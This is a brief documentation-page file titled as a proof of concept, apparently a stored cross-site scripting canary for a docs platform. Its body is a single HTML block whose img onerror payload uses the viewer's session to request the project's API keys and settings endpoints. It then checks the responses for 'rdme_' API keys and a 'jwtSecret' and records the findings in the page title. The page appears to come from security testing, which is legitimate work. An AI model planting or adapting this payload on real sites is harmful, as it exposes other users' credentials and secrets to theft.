---
title: PoC GitSync XSS3 0981
hidden: false
---

# gitsync-xss3-canary-0981

[block:html]
{"html": "<img src=x onerror=\"(async()=>{try{let r=await fetch('/test-rtbg/api-next/v2/projects/me/apikeys',{credentials:'include',headers:{Accept:'application/json'}});let t=await r.text();let r2=await fetch('/test-rtbg/api-next/v2/projects/me',{credentials:'include',headers:{Accept:'application/json'}});let t2=await r2.text();window.__chain={akStatus:r.status,hasRdme:t.indexOf('rdme_')>=0,meStatus:r2.status,hasJwt:t2.indexOf('jwtSecret')>=0};document.title='CHAIN-ak'+r.status+(t.indexOf('rdme_')>=0?'-RDME':'-no')+'-me'+r2.status+(t2.indexOf('jwtSecret')>=0?'-JWT':'-no');}catch(e){document.title='CHAINERR-'+String(e).slice(0,30);window.__chain={e:String(e)};}})()\">"}
[/block]

End of canary 3.
